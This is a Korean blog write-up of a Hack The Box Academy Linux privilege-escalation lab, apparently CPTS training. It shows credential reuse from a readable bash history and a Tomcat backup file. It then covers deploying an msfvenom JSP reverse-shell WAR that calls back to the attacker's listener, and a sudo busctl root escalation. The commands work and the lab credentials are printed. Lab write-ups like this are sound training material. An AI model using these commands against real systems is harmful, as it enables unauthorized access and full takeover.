---
title: "Linux Privilege Escalation - Skills Assessment"
date: 2026-06-11
layout: single
excerpt: "INLANEFREIGHT 조직에서 외부에 공개된 웹 서버 중 하나를 대상으로 보안 강화 평가를 수행해 달라는 의뢰를 받았다. 클라이언트는 서버의 보안 상태를 점검할 수 있도록 낮은 권한의 사용자 계정을 제공하였다. SSH를 통해 서버에 접속한 뒤, 배운 기술을 활용해 권한 상승으로 이어질 수 있는 잘못된 설정과 기타 보안 취약점을 찾아야 한다."
author_profile: true
toc: true
toc_label: "Linux Priv"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-infra/linux-privilege-escalation-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-infra]
tags: [linux, cpts, priv-esc, cron, containers, nfs, suid, library-hijacking]
---

# Scenario

INLANEFREIGHT 조직에서 외부에 공개된 웹 서버 중 하나를 대상으로 보안 강화 평가를 수행해 달라는 의뢰를 받았다.

클라이언트는 서버의 보안 상태를 점검할 수 있도록 낮은 권한의 사용자 계정을 제공하였다. 

SSH를 통해 서버에 접속한 뒤, 배운 기술을 활용해 권한 상승으로 이어질 수 있는 잘못된 설정과 기타 보안 취약점을 찾아야 한다.

> 로그인 정보는 다음과 같다: (`htb-student` / `Academy_LLPE!`)

## Discovering Barry's Credentials

제공된 로그인 정보를 이용해 접속한 계정은 `htb-student` 이다:

```bash
htb-student@nix03:~$ id

uid=1002(htb-student) gid=1002(htb-student) groups=1002(htb-student)
```

또한 `/home` 디렉터리에서는 3명의 사용자를 발견하였다:

```bash
htb-student@nix03:/home$ ls -l

drwxr-xr-x 5 barry       barry       4096 Sep  5  2020 barry
drwxr-xr-x 4 htb-student htb-student 4096 Sep  6  2020 htb-student
drwxr-xr-x 4 mrb3n       mrb3n       4096 Sep  8  2020 mrb3n
```

이 중 `barry` 디렉토리의 `.bash_history` 파일은 다른 사용자도 읽을 수 있도록 설정되어 있었다:

```bash
htb-student@nix03:/home/barry$ ls -al | grep .bash_history 

-rwxr-xr-x 1 barry barry  360 Sep  6  2020 .bash_history
```

파일 내용은 다음과 같다:

```text
cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local

# SKIP
```

이처럼 `sshpass` 명령어의 `-p` 옵션에 비밀번호가 평문으로 저장되어 있었으며, 해당 비밀번호는 `barry_adm` 사용자와 관련된 자격증명으로 보였다.

따라서 해당 비밀번호가 `barry` 계정에도 재사용되었는지 확인하기 위해 그대로 대입해본 결과, 정상적으로 `barry` 사용자로 전환할 수 있었다:

```bash
htb-student@nix03:/home/barry$ su barry
Password: i_l0ve_s3cur1ty!

barry@nix03:~$ 
```

## Discovering the Tomcat Backup File

이후 `barry` 사용자의 그룹 정보를 확인하였다:

```bash
barry@nix03:~$ id

uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)
```

이처럼 `barry` 사용자가 `adm` 그룹에 포함되어 있는 것을 확인할 수 있었다.

`adm` 그룹은 일반적으로 로그 파일과 같은 일부 시스템 파일을 읽을 수 있는 권한을 가지지만, 해당 권한만으로는 즉시 활용 가능한 파일을 발견하지 못하였다.

따라서 `barry` 그룹과 관련된 파일을 추가로 열거하였다:

```bash
barry@nix03:~$ find / -type f -group barry -readable 2>/dev/null
```

그 결과 Tomcat과 관련된 백업 파일이 존재하였다:

```text
/etc/tomcat9/tomcat-users.xml.bak
```

위 백업 파일의 내용은 다음과 같다:

```xml
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->

 <role rolename="manager-gui"/>
 <role rolename="manager-script"/>
 <role rolename="manager-jmx"/>
 <role rolename="manager-status"/>
 <role rolename="admin-gui"/>
 <role rolename="admin-script"/>
 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>

</tomcat-users>
```

이처럼 내부에 Tomcat Manager 계정의 자격증명이 평문으로 저장되어 있었다:

```text
tomcatadm:T0mc@t_s3cret_p@ss!
```

또한 해당 계정에는 Manager 및 Host Manager 기능에 접근할 수 있는 여러 역할이 부여되어 있었다:

```text
manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script
```

Tomcat은 기본적으로 `8080` 포트를 사용하는 경우가 많다.

실제로 열려 있는 포트를 확인하기 위해 `netstat` 명령어를 실행하였다:

```bash
barry@nix03:~$ netstat -antp

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0     72 10.129.91.161:22        10.10.15.123:59996      ESTABLISHED -                   
tcp        0      1 10.129.91.161:60426     8.8.8.8:53              SYN_SENT    -                   
tcp6       0      0 :::33060                :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

## Web Enumeration

이처럼 현재 8080번 포트와 80번 포트가 외부 인터페이스에서 수신 중인 것을 확인할 수 있었다.

따라서 로컬 브라우저에서 8080번 포트의 `/manager/html` 경로에 접속하였다:

![Linux Priv](/assets/cpts-infra/linux-privilege-escalation-skills-assessment/linux-priv1.png)

접속을 시도하자 자격증명을 요구하는 인증 창이 나타났다.

따라서 앞에서 획득한 Tomcat 계정의 자격증명을 입력한 결과, 정상적으로 Tomcat Manager 페이지에 접근할 수 있었다:

![Linux Priv](/assets/cpts-infra/linux-privilege-escalation-skills-assessment/linux-priv2.png)

화면의 `Applications` 항목에서는 현재 배포되어 실행 중인 웹 애플리케이션과 각 애플리케이션의 경로를 확인할 수 있었다.

또한 페이지 아래쪽으로 이동하면 애플리케이션을 배포할 수 있는 `Deploy` 기능이 존재하였다.

### Uploading a Reverse Shell

`Deploy` 항목에는 서버 내부에 존재하는 WAR 파일을 배포하는 기능과 로컬에서 WAR 파일을 업로드하는 기능이 존재하였다.

특히 다음과 같이 `WAR file to deploy` 항목에서 파일을 선택하고 배포할 수 있었다:

![Linux Priv](/assets/cpts-infra/linux-privilege-escalation-skills-assessment/linux-priv3.png)

Tomcat은 Java Servlet과 JSP 애플리케이션을 실행하며, 웹 애플리케이션을 WAR 형식으로 배포할 수 있다.

따라서 [HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html#metasploit)를 참고하여 JSP 리버스 셸이 포함된 WAR 파일을 생성하였다.

우선 로컬 터미널에서 다음 명령어를 실행하였다:

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.123 LPORT=9001 -f war -o revshell.war

Payload size: 1089 bytes
Final size of war file: 1089 bytes
Saved as: revshell.war 
```

이렇게 하여 `revshell.war` 파일을 생성하였다.

그 후 Tomcat Manager의 `WAR file to deploy` 항목에서 `revshell.war` 파일을 선택하고 `Deploy` 버튼을 눌러 업로드하였다.

업로드가 완료되자 `Applications` 목록에 `/revshell` 경로가 새롭게 추가되었으며, `Running` 항목도 `true` 로 표시되었다:

![Linux Priv](/assets/cpts-infra/linux-privilege-escalation-skills-assessment/linux-priv4.png)

리버스 셸 연결을 수신하기 위해 로컬에서 `nc` 리스너를 실행하였다:

```bash
$ nc -lvnp 9001
```

그 후 새롭게 배포된 다음 경로에 접속하였다:

```text
http://10.129.91.161:8080/revshell
```

해당 경로에 접근하자 WAR 파일 내부의 JSP 페이로드가 실행되었으며, nc 리스너로 연결이 수신되었다:

```bash
$ nc -lvnp 9001                                                          
connect to [10.10.15.123] from (UNKNOWN) [10.129.91.161] 53904

tomcat@nix03:/var/lib/tomcat9$ 
```

이렇게 하여 `tomcat` 사용자의 셸을 획득하는 데 성공하였다.

## Abusing sudo -l

획득한 `tomcat` 셸에서 `sudo` 권한을 확인하였다:

```bash
tomcat@nix03:/var/lib/tomcat9$ sudo -l

Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

이처럼 `tomcat` 사용자는 비밀번호를 입력하지 않고 `/usr/bin/busctl` 명령어를 root 권한으로 실행할 수 있었다.

따라서 `busctl` 을 이용한 권한 상승 방법을 확인하기 위해 [GTFOBins](https://gtfobins.org/gtfobins/busctl/)를 참고하였다.

다음 명령어를 실행하였다:

```bash
tomcat@nix03:/var/lib/tomcat9$ sudo busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

`busctl` 이 `sudo` 를 통해 `root` 권한으로 실행되면서 `/bin/sh` 도 동일한 권한으로 실행되었다.

그 결과 정상적으로 루트 셸을 획득하는 데 성공하였다:

```bash
root@nix03:/var/lib/tomcat9#
```